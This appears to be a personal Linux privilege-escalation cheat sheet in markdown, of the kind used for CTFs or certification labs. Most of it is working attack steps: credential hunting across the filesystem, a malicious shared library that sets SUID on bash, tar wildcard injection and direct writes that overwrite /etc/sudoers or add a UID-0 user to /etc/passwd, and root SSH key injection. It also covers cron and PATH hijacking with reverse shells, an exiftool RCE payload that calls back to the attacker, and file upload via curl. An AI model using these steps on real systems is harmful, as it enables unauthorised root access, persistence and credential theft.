# Enum
- Find all useful files (config file, env file) when gained foothold
- brute force find password: ``` find / -type f -readable -exec grep -H "password" {} + 2>/dev/null ```
## Useful Info
- ``` ls -l /etc/shadow ``` see permission of if can see hashed password 
- ```  id ``` check current user uid, gid (primary group) & groups (other groups)

### Disk group / Others
- ``` cat /etc/passwd ``` lists several user accounts
    ```
        1. Login Name: Indicates the username used for login.
        2. Encrypted Password: This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly).
        3. UID: Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID.
        4. GID: Represents the user's specific Group ID.
        5. Comment:  This field generally contains a description about the user, often simply repeating username information.
        6. Home Folder: Describes the user's home directory prompted upon login.
        7. Login Shell: Indicates the default interactive shell, if one exists.
    ```
- ``` hostname``` OS Type + description (not too useful)
  
- ``` cat /etc/lsb-release ``` | ``` cat /etc/issue ``` | ``` cat /etc/os-release ``` | ```uname -a``` OS release & version (Search the OS + exploit in google!)
- ``` ps aux``` show all process 
  ### Arbitrary file read
  1. for reading process command line``` /proc/self/cmdline``` || ``` /proc/{pid}/cmdline``` || ``` /proc/self/environ ``` || ``` /proc/self/cwd/.env ``` || ``` /proc/self/stat ```
  2. for reading all processes ``` /proc/sched_debug```
  3. ssh config ``` /etc/ssh/sshd_config ```
  4. [read as Root] All interesting file same as normal PrivEsc e.g. ``` .bash_history``` || ``` id_rsa ``` || ```authoirzed_keys ``` etc... 

- ``` netstat -anl ``` search exposed service
- ``` ip a ``` list all network card & info in this machine
- ``` route ``` | ``` routel ``` show network routing tables (easy fuck itself localhost services to priv esc)
- ``` ss -anp ``` list all connection
- ``` cat /etc/iptables/rules.v4 ``` need root to see iptables (firewall rules)
- ``` sudo lsof -i -P -n | grep LISTEN ``` show exposed ports 

- ``` ls -lah /etc/cron* ``` list all cron jobs with files and directories 
- ``` crontab -l ``` list the cronjob that current user run | for ``` sudo crontab -l ``` can see jobs run by root
- ``` dpkg -l | rpm ``` list all package 
    ``` 
        Debian-based (Debian, Ubuntu, etc.): dpkg, apt, aptitude
        Red Hat-based (Red Hat Enterprise Linux, CentOS, Fedora, etc.): rpm, yum, dnf
        SUSE-based (openSUSE, SUSE Linux Enterprise, etc.): rpm, zypper
        Arch Linux-based (Arch Linux, Manjaro, etc.): pacman
        Gentoo-based: emerge, Portage
        Slackware-based: pkgtool, slackpkg
        FreeBSD: pkg, FreeBSD Ports
        OpenBSD: pkg_add, OpenBSD Ports
    ```
- ``` find / -writable -type d 2>/dev/null ``` find all writable file of current user
### Writable file
1. Not every file can be replaced and move so try to modify the content by echo
2. try ``` echo "sussy thing" > {writable file} ```
3. If the files cannot directly access, try symlink to accessable path
   ```
        ln -sf /home/m.sander/personal/creds-for-2022.txt creds.txt
   ```

- ``` find / -user {username} -ls 2>/dev/null  | grep -v '^/proc\|^/run\|^/sys\|^/snap' ``` find all files the user own
### Look for unusual groups also
1. Disk group
- If saw ``` 6(disk)  ```, can see who disk
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe 
- Persistant: crack /etc/shadow password OR find root ssh keys 
2. Other interesting non system group: get files belonging to that group ``` find / -group {group name} 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap' ```

- ``` mount ``` check all mounted filesystems
- ``` cat /etc/fstab ``` check all drives in boot time
- ``` lsblk ``` list all available disk
- ``` lsmod ``` list all drivers installed
- ``` /sbin/modinfo {driver_name} ``` get detail or certain drivers
- ``` find / -perm -u=s -type f 2>/dev/null ``` find all SUID/SGID marked file for ez impersonate permission for everyone
- Can Use ``` strings ``` to read binaries details under ``` /usr/bin ```
- given binary to be executed with root permissions even when launched by a lower-privileged user is called the effective UID (EUID)
- Reading history of Users ```/home/{username}/.history```
- Debugging a executable ``` strace {app name e.g. bash} ```

## Auto Enum
- file transfer from kali to remote 
   1. remote ``` nc -nlvp 3333 > unix-privesc-check ```
   2. kali ``` nc -nv 192.168.158.214 3333 < unix-privesc-check ```
   3. ``` chmod +x {file_name} ```
- ``` unix-privesc-check standard > output.txt ``` & ignore error
- looks for sussy shit e.g. global writable thing

# Exposed Confidential info
## Backup files 
- check linpeas result
- e.g. /opt/backups /etc/backups ,etc...
- Some files will have credentials can directly use e.g. /etc/passwd  ssh-key rsa
## Abusing sudo backup function / scrips
1. moving the old file to ``` file.old ```
2. writing a symoblic link of a file ```ln -s /root/.ssh/id_rsa {file}``` 
3. run the sudo able 

## User trails
- ``` env ``` environ variable
- ``` .bashrc ``` bash config file (this file is fucking hidden on99)
- ``` sudo -l``` list sudoer capabilities to user
- ``` find / -name flag.txt 2>/dev/null ``` find flag.txt in linux

### Hijacking $PATH injection
- if something not absolute path --> can hijack to the file we forged e.g. rev shell
1. Get current $Path first ``` echo $PATH ```
2. add the new directory to $path ``` export "PATH=$(pwd): {the value you get in step 1} " ```

## Service footprints
- ``` watch -n 1 "ps -aux | grep pass" ``` process
- ``` sudo tcpdump -i lo -A | grep "pass" ``` tcp traffic
- ``` timeout 5m ./pspy64 ``` but dunno how use yet
### Careful of every Process cmdline
- [PSPY64] if process ends with ```/etc/cron.{hourly} ``` , can abuse
- Carefully read every processes when found writable files in $PATH!
### sudo -l with .sh file
1. if the .sh file has some command line with sentitive params e.g. mysql -u root -p {masked}
2. good to start pspy first -> then run the sudo .sh file

# Bad File permissions 
## Cron jobss hack
- ``` grep "CRON" /var/log/syslog ``` grep from syslog (messages from various system services and daemons, including the cron daemon)
- change the file to rev shell , ez
- [Root jobs] try to run the executable to see if have errors e.g. missing .so / .o library files
### Forging so library file (dynamic linker)
1. finding writable paths e.g. ``` LD_LIBRARY_PATH ``` 
2. write sussy.c 
   ```
        #include <stdio.h>
        #include <unistd.h>
        #include <sys/types.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject(){
            setuid(0);
            setgid(0);
            printf("I'm the bad library\n");
            system("chmod +s /bin/bash"); #ChangeThisCMD 
        }
    ```
3. compile it in victim pc ``` gcc -shared -o sussy.so -fPIC sussy.c```
4. wait the cronjob done and [if] using SUID stragegy: run priviledged bash``` bash -p ``` 

## Password authN hack
- unless AD/LDAP, its store in /etc/shadow, write to passwd still works sometimes
- gen 'crypt' hash password ``` openssl passwd {password_plain} ```
- mock user to passwd ``` echo "root2:{password_hashed}:0:0:root:/root:/bin/bash" >> /etc/passwd ```

# Fuck Linux system componenets
### Linpeas: `Executing Linux Exploit Suggester` 
- try the exploits if no idea & if GCC is there (high prob)

### Possible exploit
- GTFO: https://gtfobins.github.io/ 
- SBin: reboot/shutdown(harder caz u have know how to restart): https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/ 
    1. editing writable service ``` find / -writable -name "*.service" 2>/dev/null ``` and impersonate root when restarted
    2. OR directly write rev shell in the command and when restart will auto connect to our nc-lvnp

## Setuid binaries and others
- GTFO: SetUID
- ``` /usr/sbin/getcap -r / 2>/dev/null ``` search misconfigured capabilities e.g. will find perl, ping , or even other binary
- see have ``` cap_setuid+ep```
- go gtfobins look for Capabilities 
- find harder (lookup all bins & PwnKits!!)

### Wildcard Spare tricks
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
1. wildcards with tar in bash script: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa 
-   ```
        # 1. CD to the backup dir
        cd /var/www/html/uploads

        # 2. Create files in the current directory called
        # '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'

        echo "" > '--checkpoint=1'
        echo "" > '--checkpoint-action=exec=sh privesc.sh'

        # 3. Create a privesc.sh bash script, that allows for privilege escalation
        #malicous.sh:
        echo '{current username} ALL=(root) NOPASSWD: ALL' > /etc/sudoers
    ```
2. 7z / 7za (read file by error e.g. backup.log)
   - As the content of this file isn't a list of files -> error will print that file value 
   ```
        # 1. CD the backup dir
            cd /var/www/html/uploads
        
        # 2. create a file
            touch @root.txt
        
        # 3. add symlink
            ln -sf /file/you/want/to/read root.txt

   ```

### Bypass authN in script with *
1. https://mywiki.wooledge.org/BashPitfalls 
2. e.g. 
    ```
        if [[ $DB_PASS == $USER_PASS ]] 
    ```
### Exiftool RCE 
- If version < 12.23, and cronjob running sudo of exiftool
- https://github.com/convisolabs/CVE-2021-22204-exiftool
1. build image in kali ``` python3 50911.py -s {kali ip} {kali port} ```
2. move the image.jpg to victim directory e.g. ``` wget http://xxx/image ```

### Write to system files for misconfigure Bins
- Example: dosbox w/ SUID
1. /etc/sudoers: ``` echo {current_user_id} ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers ```
2. /etc/passwd: ``` echo root2:{}:0:0:root:/root:/bin/bash >> /etc/passwd ``` (generated by ```openssl passwd {password}``` )
3. /root/.ssh/authorized_keys: ``` echo ssh-rsa AAAAB3Nza.... >> /root/.ssh/authorized_keys ``` (generated by ssh-keygen)

#### Logic behind
- check if the process is being used by root but normal user trigger ``` ps u -C passwd ```
- e.g ``` passwd ``` will have 1000 0 0 0 = SUID is there | normally all value point to same user
- ``` ls -asl /usr/bin/passwd ``` check permission if have SUID Flag

## Fuck sudo itself
- GTFO: Sudo
- list all current user can use sudo to run 
- brute force those capabilities to PE
- if not success -> check error ``` cat /var/log/syslog | grep {binary_name} ```
- ***Can focus those unknown binary, if the binary doesnot directly drop privesc, find what is it running, see if can edit command inside some params e.g. makefile? 

### Interesting sudo leveraging
1. Binding to process with sudo
   - e.g. ```gcore``` doesnt drop direct priv esc but can attach to PID and dump memories
   - try to attach to contain 'password' process or sus process
   - ``` strings {dumped file} ```

## Kernal fuck
- search public exploit | sometime need pull file to victim compile and run
- ``` file {binary}``` can see ELF file architecture
- useful search: ``` searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8" ```

## doas
- ``` doas -s ``` get root shell

# Services
1. some linux executable may need terminal to run --> can try to spawn python3 shell

## Upload root key to root account
1.  ssh-keygen -f root-fake
2.  put ```root-fake.pub``` to ```/root/.ssh/authorized_keys``` 

### Upload Thru http server
1. ``` curl {ip}/{file} --upload-file {file}

## Mail server
1. if mail server is on --> check emails if have secrets ```/var/spoof/mail```
